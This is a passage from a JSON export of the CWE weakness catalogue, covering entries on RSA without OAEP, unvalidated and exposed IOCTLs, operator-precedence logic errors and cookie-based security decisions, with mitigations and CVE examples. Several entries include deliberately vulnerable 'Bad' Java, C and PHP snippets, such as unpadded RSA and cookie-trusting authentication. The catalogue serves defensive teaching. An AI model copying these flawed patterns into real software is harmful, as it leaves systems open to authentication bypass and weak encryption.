          "Description": "Support a maximum size for the log file that can be controlled by the administrator. If the maximum size is reached, the admin should be notified. Also, consider reducing functionality of the product. This may result in a denial-of-service to legitimate product users, but it will prevent the product from adversely impacting the entire system."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Adjust configurations appropriately when the product is transitioned from a debug state to production."
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2007-0421",
          "Description": "server records a large amount of data to the server log when it receives malformed headers",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-0421"
        },
        {
          "Reference": "CVE-2002-1154",
          "Description": "chain: application does not restrict access to front-end for updates, which allows attacker to fill the error log",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1154"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 3-3",
          "EntryName": "Req SR 7.2"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-1",
          "EntryName": "Req SD-1"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-1",
          "EntryName": "Req SVV-3"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-2",
          "EntryName": "Req CR 7.2"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "780",
      "Name": "Use of RSA Algorithm without OAEP",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses the RSA algorithm but does not incorporate Optimal Asymmetric Encryption Padding (OAEP), which might weaken the encryption.",
      "ExtendedDescription": "Padding schemes are often used with cryptographic algorithms to make the plaintext less predictable and complicate attack efforts. The OAEP scheme is often used with RSA to nullify the impact of predictable common text.",
      "LikelihoodOfExploit": "Medium",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "327",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Bypass Protection Mechanism"
          ],
          "Note": "Without OAEP in RSA encryption, it will take less work for an attacker to decrypt the data or to infer patterns from the ciphertext."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The example below attempts to build an RSA cipher."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic Cipher getRSACipher() {\n\t\tCipher rsa = null;\n\t\ttry {\n\t\t\trsa = javax.crypto.Cipher.getInstance(\"RSA/NONE/NoPadding\");\n\t\t}\n\t\tcatch (java.security.NoSuchAlgorithmException e) {\n\t\t\tlog(\"this should never happen\", e);\n\t\t}\n\t\tcatch (javax.crypto.NoSuchPaddingException e) {\n\t\t\tlog(\"this should never happen\", e);\n\t\t}\n\t\treturn rsa;\n\t}\n```"
            },
            {
              "BodyText": "While the previous code successfully creates an RSA cipher, the cipher does not use padding. The following code creates an RSA cipher using OAEP."
            },
            {
              "Nature": "Good",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic Cipher getRSACipher() {\n\t\tCipher rsa = null;\n\t\ttry {\n\t\t\trsa = javax.crypto.Cipher.getInstance(\"RSA/ECB/OAEPWithMD5AndMGF1Padding\");\n\t\t}\n\t\tcatch (java.security.NoSuchAlgorithmException e) {\n\t\t\tlog(\"this should never happen\", e);\n\t\t}\n\t\tcatch (javax.crypto.NoSuchPaddingException e) {\n\t\t\tlog(\"this should never happen\", e);\n\t\t}\n\t\treturn rsa;\n\t}\n```"
            }
          ]
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-694",
          "Authors": [
            "Ronald L. Rivest",
            "Burt Kaliski"
          ],
          "Title": "RSA Problem",
          "PublicationYear": "2003",
          "PublicationMonth": "12",
          "PublicationDay": "10",
          "URL": "http://people.csail.mit.edu/rivest/RivestKaliski-RSAProblem.pdf"
        },
        {
          "ExternalReferenceID": "REF-695",
          "Title": "Optimal Asymmetric Encryption Padding",
          "PublicationYear": "2009",
          "PublicationMonth": "07",
          "PublicationDay": "08",
          "Publisher": "Wikipedia",
          "URL": "https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "This entry could probably have a new parent related to improper padding, however the role of padding in cryptographic algorithms can vary, such as hiding the length of the plaintext and providing additional random bits for the cipher. In general, cryptographic problems in CWE are not well organized and further research is needed."
        }
      ]
    },
    {
      "ID": "781",
      "Name": "Improper Address Validation in IOCTL with METHOD_NEITHER I/O Control Code",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product defines an IOCTL that uses METHOD_NEITHER for I/O, but it does not validate or incorrectly validates the addresses that are provided.",
      "ExtendedDescription": "When an IOCTL uses the METHOD_NEITHER option for I/O control, it is the responsibility of the IOCTL to validate the addresses that have been supplied to it. If validation is missing or incorrect, attackers can supply arbitrary memory addresses, leading to code execution or a denial of service.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1285",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "822",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Often"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Often"
        },
        {
          "Type": "Operating_System",
          "Name": "Windows NT",
          "Prevalence": "Sometimes"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Availability",
            "Confidentiality"
          ],
          "Impact": [
            "Modify Memory",
            "Read Memory",
            "Execute Unauthorized Code or Commands",
            "DoS: Crash, Exit, or Restart"
          ],
          "Note": "An attacker may be able to access memory that belongs to another process or user. If the attacker can control the contents that the IOCTL writes, it may lead to code execution at high privilege levels. At the least, a crash can occur."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "If METHOD_NEITHER is required for the IOCTL, then ensure that all user-space addresses are properly validated before they are first accessed. The ProbeForRead and ProbeForWrite routines are available for this task. Also properly protect and manage the user-supplied buffers, since the I/O Manager does not do this when METHOD_NEITHER is being used. See References."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "If possible, avoid using METHOD_NEITHER in the IOCTL and select methods that effectively control the buffer size, such as METHOD_BUFFERED, METHOD_IN_DIRECT, or METHOD_OUT_DIRECT."
        },
        {
          "Phase": [
            "Architecture and Design",
            "Implementation"
          ],
          "Description": "If the IOCTL is part of a driver that is only intended to be accessed by trusted users, then use proper access control for the associated device or device namespace. See References."
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2006-2373",
          "Description": "Driver for file-sharing and messaging protocol allows attackers to execute arbitrary code.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-2373"
        },
        {
          "Reference": "CVE-2009-0686",
          "Description": "Anti-virus product does not validate addresses, allowing attackers to gain SYSTEM privileges.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-0686"
        },
        {
          "Reference": "CVE-2009-0824",
          "Description": "DVD software allows attackers to cause a crash.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-0824"
        },
        {
          "Reference": "CVE-2008-5724",
          "Description": "Personal firewall allows attackers to gain SYSTEM privileges.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-5724"
        },
        {
          "Reference": "CVE-2007-5756",
          "Description": "chain: device driver for packet-capturing software allows access to an unintended IOCTL with resultant array index error.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-5756"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-696",
          "Authors": [
            "Ruben Santamarta"
          ],
          "Title": "Exploiting Common Flaws in Drivers",
          "PublicationYear": "2007",
          "PublicationMonth": "07",
          "PublicationDay": "11",
          "URL": "http://reversemode.com/index.php?option=com_content&task=view&id=38&Itemid=1"
        },
        {
          "ExternalReferenceID": "REF-697",
          "Authors": [
            "Yuriy Bulygin"
          ],
          "Title": "Remote and Local Exploitation of Network Drivers",
          "PublicationYear": "2007",
          "PublicationMonth": "08",
          "PublicationDay": "01",
          "URL": "https://www.blackhat.com/presentations/bh-usa-07/Bulygin/Presentation/bh-usa-07-bulygin.pdf"
        },
        {
          "ExternalReferenceID": "REF-698",
          "Authors": [
            "Anibal Sacco"
          ],
          "Title": "Windows driver vulnerabilities: the METHOD_NEITHER odyssey",
          "PublicationYear": "2008",
          "PublicationMonth": "10",
          "URL": "http://www.net-security.org/dl/insecure/INSECURE-Mag-18.pdf"
        },
        {
          "ExternalReferenceID": "REF-699",
          "Authors": [
            "Microsoft"
          ],
          "Title": "Buffer Descriptions for I/O Control Codes",
          "URL": "https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/buffer-descriptions-for-i-o-control-codes",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-700",
          "Authors": [
            "Microsoft"
          ],
          "Title": "Using Neither Buffered Nor Direct I/O",
          "URL": "https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-neither-buffered-nor-direct-i-o",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-701",
          "Authors": [
            "Microsoft"
          ],
          "Title": "Securing Device Objects",
          "URL": "https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/controlling-device-access",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-702",
          "Authors": [
            "Piotr Bania"
          ],
          "Title": "Exploiting Windows Device Drivers",
          "URL": "https://www.piotrbania.com/all/articles/ewdd.pdf",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Applicable Platform",
          "Note": "\n\nBecause IOCTL functionality is typically performing low-level actions and closely interacts with the operating system, this weakness may only appear in code that is written in low-level languages.\n"
        },
        {
          "Type": "Research Gap",
          "Note": "\n\nWhile this type of issue has been known since 2006, it is probably still under-studied and under-reported. Most of the focus has been on high-profile software and security products, but other kinds of system software also use drivers. Since exploitation requires the development of custom code, it requires some skill to find this weakness.\n\n\nBecause exploitation typically requires local privileges, it might not be a priority for active attackers. However, remote exploitation may be possible for software such as device drivers. Even when remote vectors are not available, it may be useful as the final privilege-escalation step in multi-stage remote attacks against application-layer software, or as the primary attack by a local user on a multi-user system.\n"
        }
      ]
    },
    {
      "ID": "782",
      "Name": "Exposed IOCTL with Insufficient Access Control",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product implements an IOCTL with functionality that should be restricted, but it does not properly enforce access control for the IOCTL.",
      "ExtendedDescription": "\n\nWhen an IOCTL contains privileged functionality and is exposed unnecessarily, attackers may be able to access this functionality by invoking the IOCTL. Even if the functionality is benign, if the programmer has assumed that the IOCTL would only be accessed by a trusted process, there may be little or no validation of the incoming data, exposing weaknesses that would never be reachable if the attacker cannot call the IOCTL directly.\n\n\nThe implementations of IOCTLs will differ between operating system types and versions, so the methods of attack and prevention may vary widely.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "749",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "781",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Often"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Often"
        },
        {
          "Type": "Operating_System",
          "Class": "Unix",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Operating_System",
          "Class": "Windows",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Availability",
            "Confidentiality"
          ],
          "Impact": [
            "Varies by Context"
          ],
          "Note": "Attackers can invoke any functionality that the IOCTL offers. Depending on the functionality, the consequences may include code execution, denial-of-service, and theft of data."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "In Windows environments, use proper access control for the associated device or device namespace. See References."
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2009-2208",
          "Description": "Operating system does not enforce permissions on an IOCTL that can be used to modify network settings.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2208"
        },
        {
          "Reference": "CVE-2008-3831",
          "Description": "Device driver does not restrict ioctl calls to its direct rendering manager.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-3831"
        },
        {
          "Reference": "CVE-2008-3525",
          "Description": "ioctl does not check for a required capability before processing certain requests.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-3525"
        },
        {
          "Reference": "CVE-2008-0322",
          "Description": "Chain: insecure device permissions allows access to an IOCTL, allowing arbitrary memory to be overwritten.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-0322"
        },
        {
          "Reference": "CVE-2007-4277",
          "Description": "Chain: anti-virus product uses weak permissions for a device, leading to resultant buffer overflow in an exposed IOCTL.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-4277"
        },
        {
          "Reference": "CVE-2007-1400",
          "Description": "Chain: sandbox allows opening of a TTY device, enabling shell commands through an exposed ioctl.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-1400"
        },
        {
          "Reference": "CVE-2006-4926",
          "Description": "Anti-virus product uses insecure security descriptor for a device driver, allowing access to a privileged IOCTL.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-4926"
        },
        {
          "Reference": "CVE-1999-0728",
          "Description": "Unauthorized user can disable keyboard or mouse by directly invoking a privileged IOCTL.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-1999-0728"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-701",
          "Authors": [
            "Microsoft"
          ],
          "Title": "Securing Device Objects",
          "URL": "https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/controlling-device-access",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Relationship",
          "Note": "This can be primary to many other weaknesses when the programmer assumes that the IOCTL can only be accessed by trusted parties. For example, a program or driver might not validate incoming addresses in METHOD_NEITHER IOCTLs in Windows environments (CWE-781), which could allow buffer overflow and similar attacks to take place, even when the attacker never should have been able to access the IOCTL at all."
        },
        {
          "Type": "Applicable Platform",
          "Note": "\n\nBecause IOCTL functionality is typically performing low-level actions and closely interacts with the operating system, this weakness may only appear in code that is written in low-level languages.\n"
        }
      ]
    },
    {
      "ID": "783",
      "Name": "Operator Precedence Logic Error",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product uses an expression in which operator precedence causes incorrect logic to be used.",
      "ExtendedDescription": "While often just a bug, operator precedence logic errors can have serious consequences if they are used in security-critical code, such as making an authentication decision.",
      "LikelihoodOfExploit": "Low",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "670",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Rarely"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Rarely"
        },
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Rarely"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "Logic errors related to operator precedence may cause problems even during normal operation, so they are probably discovered quickly during the testing phase. If testing is incomplete or there is a strong reliance on manual review of the code, then these errors may not be discovered before the software is deployed."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Integrity",
            "Availability"
          ],
          "Impact": [
            "Varies by Context",
            "Unexpected State"
          ],
          "Note": "The consequences will vary based on the context surrounding the incorrect precedence. In a security decision, integrity or confidentiality are the most likely results. Otherwise, a crash may occur due to the software reaching an unexpected state."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Regularly wrap sub-expressions in parentheses, especially in security-critical code."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "In the following example, the method validateUser makes a call to another method to authenticate a username and password for a user and returns a success or failure code."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\t#define FAIL 0\n\t#define SUCCESS 1\n\t...\n\tint validateUser(char *username, char *password) {\n\t\t\tint isUser = FAIL;\n```\n// call method to authenticate username and password* \n\t\t\t\n\t\t\t\n\t\t\t *// if authentication fails then return failure otherwise return success* \n\t\t\tif (isUser = AuthenticateUser(username, password) == FAIL) {\n\t\t\t```\n\t\t\t\treturn isUser;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tisUser = SUCCESS;\n\t\t\t}\n\t\t\treturn isUser;\n\t}\n```"
            },
            {
              "BodyText": "However, the method that authenticates the username and password is called within an if statement with incorrect operator precedence logic. Because the comparison operator \"==\" has a higher precedence than the assignment operator \"=\", the comparison operator will be evaluated first and if the method returns FAIL then the comparison will be true, the return variable will be set to true and SUCCESS will be returned. This operator precedence logic error can be easily resolved by properly using parentheses within the expression of the if statement, as shown below."
            },
            {
              "Nature": "Good",
              "Language": "C",
              "ExampleCode": "```\n\t...\n\tif ((isUser = AuthenticateUser(username, password)) == FAIL) {\n\t...\n```"
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "In this example, the method calculates the return on investment for an accounting/financial application. The return on investment is calculated by subtracting the initial investment costs from the current value and then dividing by the initial investment costs."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic double calculateReturnOnInvestment(double currentValue, double initialInvestment) {\n\t\t\tdouble returnROI = 0.0;\n```\n// calculate return on investment* \n\t\t\treturnROI = currentValue - initialInvestment / initialInvestment;\n\t\t\t\n\t\t\treturn returnROI;}"
            },
            {
              "BodyText": "However, the return on investment calculation will not produce correct results because of the incorrect operator precedence logic in the equation. The divide operator has a higher precedence than the minus operator, therefore the equation will divide the initial investment costs by the initial investment costs which will only subtract one from the current value. Again this operator precedence logic error can be resolved by the correct use of parentheses within the equation, as shown below."
            },
            {
              "Nature": "Good",
              "Language": "Java",
              "ExampleCode": "```\n\t...\n\treturnROI = (currentValue - initialInvestment) / initialInvestment;\n\t...\n```"
            },
            {
              "BodyText": "Note that the initialInvestment variable in this example should be validated to ensure that it is greater than zero to avoid a potential divide by zero error (CWE-369)."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2008-2516",
          "Description": "Authentication module allows authentication bypass because it uses \"(x = call(args) == SUCCESS)\" instead of \"((x = call(args)) == SUCCESS)\".",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-2516"
        },
        {
          "Reference": "CVE-2008-0599",
          "Description": "Chain: Language interpreter calculates wrong buffer size (CWE-131) by using \"size = ptr ? X : Y\" instead of \"size = (ptr ? X : Y)\" expression.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-0599"
        },
        {
          "Reference": "CVE-2001-1155",
          "Description": "Chain: product does not properly check the result of a reverse DNS lookup because of operator precedence (CWE-783), allowing bypass of DNS-based access restrictions.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2001-1155"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "EXP00-C",
          "EntryName": "Use parentheses for precedence of operation",
          "MappingFit": "Exact"
        },
        {
          "TaxonomyName": "SEI CERT Perl Coding Standard",
          "EntryID": "EXP04-PL",
          "EntryName": "Do not mix the early-precedence logical operators with late-precedence logical operators",
          "MappingFit": "CWE More Abstract"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-704",
          "Authors": [
            "CERT"
          ],
          "Title": "EXP00-C. Use parentheses for precedence of operation",
          "URL": "https://www.securecoding.cert.org/confluence/display/seccode/EXP00-C.+Use+parentheses+for+precedence+of+operation"
        },
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 6, \"Precedence\", Page 287",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "784",
      "Name": "Reliance on Cookies without Validation and Integrity Checking in a Security Decision",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product uses a protection mechanism that relies on the existence or values of a cookie, but it does not properly ensure that the cookie is valid for the associated user.",
      "ExtendedDescription": "Attackers can easily modify cookies, within the browser or by implementing the client-side code outside of the browser. Attackers can bypass protection mechanisms such as authorization and authentication by modifying the cookie to contain an expected value.",
      "LikelihoodOfExploit": "High",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "807",
          "ViewID": "1000"
        },
        {
          "Nature": "ChildOf",
          "CweID": "565",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "Web Based",
          "Prevalence": "Often"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Bypass Protection Mechanism",
            "Gain Privileges or Assume Identity"
          ],
          "Note": "It is dangerous to use cookies to set a user's privileges. The cookie can be manipulated to claim a high level of authorization, or to claim that successful authentication has occurred."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Avoid using cookie data for a security-related decision."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Perform thorough input validation (i.e.: server side validation) on the cookie data if you're going to use it for a security related decision."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Add integrity checks to detect tampering."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Protect critical cookies from replay attacks, since cross-site scripting or other attacks may allow attackers to steal a strongly-encrypted cookie that also passes integrity checks. This mitigation applies to cookies that should only be valid during a single transaction or session. By enforcing timeouts, you may limit the scope of an attack. As part of your integrity check, use an unpredictable, server-side value that is not exposed to the client."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-15",
          "Entries": [
            {
              "IntroText": "The following code excerpt reads a value from a browser cookie to determine the role of the user."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tCookie[] cookies = request.getCookies();\n\tfor (int i =0; i< cookies.length; i++) {\n\t\tCookie c = cookies[i];\n\t\tif (c.getName().equals(\"role\")) {\n\t\t\tuserRole = c.getValue();\n\t\t}\n\t}\n```"
            }
          ]
        },
        {
          "ID": "DX-16",
          "Entries": [
            {
              "IntroText": "The following code could be for a medical records application. It performs authentication by checking if a cookie has been set."
            },
            {
              "Nature": "Bad",
              "Language": "PHP",
              "ExampleCode": "```\n\t$auth = $_COOKIES['authenticated'];\n\tif (! $auth) {\n\t\tif (AuthenticateUser($_POST['user'], $_POST['password']) == \"success\") {\n\t\t\t// save the cookie to send out in future responses\n\t\t\tsetcookie(\"authenticated\", \"1\", time()+60*60*2);\n\t\t}\n\t\telse {\n\t\t\tShowLoginScreen();\n\t\t\tdie(\"\\n\");\n\t\t}\n\t}\n\tDisplayMedicalHistory($_POST['patient_ID']);\n```"
            },
            {
              "BodyText": "The programmer expects that the AuthenticateUser() check will always be applied, and the \"authenticated\" cookie will only be set when authentication succeeds. The programmer even diligently specifies a 2-hour expiration for the cookie."
            },
            {
              "BodyText": "However, the attacker can set the \"authenticated\" cookie to a non-zero value such as 1. As a result, the $auth variable is 1, and the AuthenticateUser() check is not even performed. The attacker has bypassed the authentication."
            }
          ]
        },
        {
          "ID": "DX-17",
          "Entries": [
            {
              "IntroText": "In the following example, an authentication flag is read from a browser cookie, thus allowing for external control of user state data."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tCookie[] cookies = request.getCookies();\n\tfor (int i =0; i< cookies.length; i++) {\n\t\tCookie c = cookies[i];\n\t\tif (c.getName().equals(\"authenticated\") && Boolean.TRUE.equals(c.getValue())) {\n\t\t\tauthenticated = true;\n\t\t}\n\t}\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2009-1549",
          "Description": "Attacker can bypass authentication by setting a cookie to a specific value.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-1549"
        },
        {
          "Reference": "CVE-2009-1619",
          "Description": "Attacker can bypass authentication and gain admin privileges by setting an \"admin\" cookie to 1.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-1619"
        },
        {
          "Reference": "CVE-2009-0864",
          "Description": "Content management system allows admin privileges by setting a \"login\" cookie to \"OK.\"",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-0864"
        },
        {
          "Reference": "CVE-2008-5784",
          "Description": "e-dating application allows admin privileges by setting the admin cookie to 1.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-5784"
        },
        {
          "Reference": "CVE-2008-6291",
          "Description": "Web-based email list manager allows attackers to gain admin privileges by setting a login cookie to \"admin.\"",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-6291"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-706",
          "Authors": [
            "Steve Christey"
          ],
          "Title": "Unforgivable Vulnerabilities",
          "PublicationYear": "2007",
          "PublicationMonth": "08",
          "PublicationDay": "02",
          "URL": "http://cve.mitre.org/docs/docs-2007/unforgivable.pdf"
        },
        {
          "ExternalReferenceID": "REF-7",
          "Section": "Chapter 13, \"Sensitive Data in Cookies and Fields\" Page 435",
          "Authors": [
            "Michael Howard",
            "David LeBlanc"
          ],
          "Title": "Writing Secure Code",
          "Edition": "2nd Edition",
          "PublicationYear": "2002",
          "PublicationMonth": "12",
          "PublicationDay": "04",
          "Publisher": "Microsoft Press",
          "URL": "https://www.microsoftpressstore.com/store/writing-secure-code-9780735617223"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "A new parent might need to be defined for this entry. This entry is specific to cookies, which reflects the significant number of vulnerabilities being reported for cookie-based authentication in CVE during 2008 and 2009. However, other types of inputs - such as parameters or headers - could also be used for similar authentication or authorization. Similar issues (under the Research view) include CWE-247 and CWE-472."
        }
      ]
    },
    {
      "ID": "785",
      "Name": "Use of Path Manipulation Function without Maximum-sized Buffer",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product invokes a function for normalizing paths or file names, but it provides an output buffer that is smaller than the maximum possible size, such as PATH_MAX.",
